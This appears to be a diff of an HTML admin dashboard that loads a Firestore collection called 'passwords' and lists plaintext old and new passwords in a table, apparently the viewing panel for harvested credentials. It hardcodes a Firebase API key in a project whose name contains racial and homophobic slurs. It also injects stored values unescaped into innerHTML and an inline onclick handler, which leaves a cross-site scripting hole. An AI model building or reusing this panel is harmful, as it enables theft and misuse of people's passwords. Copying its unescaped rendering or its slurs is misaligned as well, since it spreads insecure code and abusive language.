@@ -4,93 +4,74 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Dashboard</title>
-  <!-- Tailwind CSS from CDN -->
-  <script src="https://cdn.jsdelivr.net/npm/tailwindcss@2.0.3/dist/tailwind.min.css"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js"></script>
-
   <style>
+    /* Base Styles */
     body {
-      font-family: 'Arial', sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       margin: 0;
       padding: 0;
+      background-color: #f4f7fc;
+      color: #333;
     }
-    /* Sidebar */
-    .sidebar {
-      width: 250px;
-      height: 100vh;
-      position: fixed;
-      top: 0;
-      left: 0;
-      background-color: #2d3748;
-      padding-top: 50px;
-      padding-left: 20px;
-    }
-    .sidebar a {
-      display: block;
-      padding: 15px 0;
-      color: #e2e8f0;
-      font-size: 16px;
-      font-weight: 500;
-      text-decoration: none;
-      border-bottom: 1px solid #4a5568;
-      transition: background-color 0.3s;
-    }
-    .sidebar a:hover {
-      background-color: #4a5568;
-    }
-    .sidebar h2 {
-      color: white;
+    h1 {
       font-size: 24px;
-      font-weight: 700;
-      margin-bottom: 30px;
+      margin-bottom: 10px;
     }
 
-    /* Table */
-    .table-container {
-      padding: 30px;
-      background: white;
+    /* Dashboard Layout */
+    .container {
+      width: 90%;
+      max-width: 1200px;
+      margin: 40px auto;
+      background-color: #fff;
       border-radius: 8px;
-      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+      padding: 20px;
     }
+
+    .table-wrapper {
+      overflow-x: auto;
+    }
+
     table {
       width: 100%;
       border-collapse: collapse;
+      margin-top: 20px;
     }
     th, td {
       padding: 12px;
       text-align: left;
-      border-bottom: 1px solid #e2e8f0;
+      border-bottom: 1px solid #ddd;
     }
     th {
-      background-color: #2d3748;
+      background-color: #007BFF;
       color: white;
     }
     td {
-      background-color: #f7fafc;
+      background-color: #f9f9f9;
     }
-    button {
-      padding: 8px 12px;
-      background-color: #e53e3e;
-      color: white;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-weight: 500;
-    }
-    button:hover {
-      background-color: #c53030;
+    tr:nth-child(even) {
+      background-color: #f1f1f1;
     }
 
-    /* Mobile Responsiveness */
-    @media (max-width: 768px) {
-      .sidebar {
-        width: 100%;
-        height: auto;
-        position: relative;
-      }
-      .content {
-        margin-left: 0;
+    /* Button Styling */
+    .btn {
+      padding: 8px 16px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .btn:hover {
+      background-color: #218838;
+    }
+
+    /* Responsive Design */
+    @media screen and (max-width: 768px) {
+      .container {
+        padding: 15px;
       }
       table {
         font-size: 14px;
@@ -98,89 +79,66 @@
     }
   </style>
 </head>
-<body class="bg-gray-100">
+<body>
 
-<!-- Sidebar -->
-<div class="sidebar">
-  <h2>Admin Panel</h2>
-  <a href="#">Dashboard</a>
-  <a href="#">Users</a>
-  <a href="#">Settings</a>
-</div>
-
-<!-- Main Content -->
-<div class="content ml-64 p-8 min-h-screen bg-gray-50">
-  <h1 class="text-4xl font-semibold text-gray-800 mb-6">Password Management Dashboard</h1>
-  <button onclick="loadData()" class="px-6 py-3 bg-blue-600 text-white font-semibold rounded-lg hover:bg-blue-700 mb-4">Load Password Data</button>
-  
-  <!-- Data Table -->
-  <div class="table-container">
-    <table class="w-full table-auto text-left text-sm">
-      <thead class="bg-gray-800 text-white">
-        <tr>
-          <th class="px-4 py-2">ID</th>
-          <th class="px-4 py-2">Old Password</th>
-          <th class="px-4 py-2">New Password</th>
-          <th class="px-4 py-2">Actions</th>
-        </tr>
-      </thead>
-      <tbody id="passwordsTable" class="text-gray-700"></tbody>
-    </table>
+  <div class="container">
+    <h1>Admin Dashboard</h1>
+    <div class="table-wrapper">
+      <table id="passwordTable">
+        <thead>
+          <tr>
+            <th>Old Password</th>
+            <th>New Password</th>
+            <th>Actions</th>
+          </tr>
+        </thead>
+        <tbody>
+          <!-- Data will be inserted here from Firebase -->
+        </tbody>
+      </table>
+    </div>
   </div>
-</div>
 
-<script>
-  // Firebase Configuration
-  const firebaseConfig = {
-    apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
-    authDomain: "gay-ass-nigga.firebaseapp.com",
-    databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
-    projectId: "gay-ass-nigga",
-    storageBucket: "gay-ass-nigga.firebasestorage.app",
-    messagingSenderId: "740449529935",
-    appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
-  };
+  <!-- Firebase Scripts -->
+  <script type="module">
+    import { initializeApp } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-app.js';
+    import { getFirestore, collection, getDocs } from 'https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore.js';
 
-  // Initialize Firebase
-  const app = firebase.initializeApp(firebaseConfig);
-  const db = firebase.firestore(app);
+    // Firebase configuration
+    const firebaseConfig = {
+      apiKey: "AIzaSyBLqQhAtNuO632Xd3-e5Fe3oYDKLJGT8K0",
+      authDomain: "gay-ass-nigga.firebaseapp.com",
+      databaseURL: "https://gay-ass-nigga-default-rtdb.firebaseio.com",
+      projectId: "gay-ass-nigga",
+      storageBucket: "gay-ass-nigga.firebasestorage.app",
+      messagingSenderId: "740449529935",
+      appId: "1:740449529935:web:ab2538ff3bdad3fbc8fa3a"
+    };
 
-  // Function to load password data
-  async function loadData() {
-    const tableBody = document.querySelector("#passwordsTable");
-    tableBody.innerHTML = ''; // Clear any existing rows
-    
-    try {
-      const querySnapshot = await db.collection("passwords").get();
-      querySnapshot.forEach(doc => {
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    // Function to load password data from Firebase Firestore
+    async function loadPasswordData() {
+      const querySnapshot = await getDocs(collection(db, "passwords"));
+      const tableBody = document.querySelector("#passwordTable tbody");
+      
+      querySnapshot.forEach((doc) => {
         const data = doc.data();
         const row = document.createElement("tr");
-
+        
         row.innerHTML = `
-          <td class="px-4 py-2 border-b">${doc.id}</td>
-          <td class="px-4 py-2 border-b">${data.oldPassword}</td>
-          <td class="px-4 py-2 border-b">${data.newPassword}</td>
-          <td class="px-4 py-2 border-b">
-            <button onclick="deletePassword('${doc.id}')" class="px-4 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700">Delete</button>
-          </td>
+          <td>${data.oldPassword}</td>
+          <td>${data.newPassword}</td>
+          <td><button class="btn" onclick="alert('Password record for ${data.oldPassword} clicked')">View</button></td>
         `;
         tableBody.appendChild(row);
       });
-    } catch (error) {
-      console.error("Error loading data: ", error);
     }
-  }
 
-  // Function to delete a password entry
-  async function deletePassword(id) {
-    try {
-      await db.collection("passwords").doc(id).delete();
-      loadData(); // Reload data after deletion
-    } catch (error) {
-      console.error("Error deleting document: ", error);
-    }
-  }
-</script>
-
+    // Load the data when the page is ready
+    window.onload = loadPasswordData;
+  </script>
 </body>
 </html>
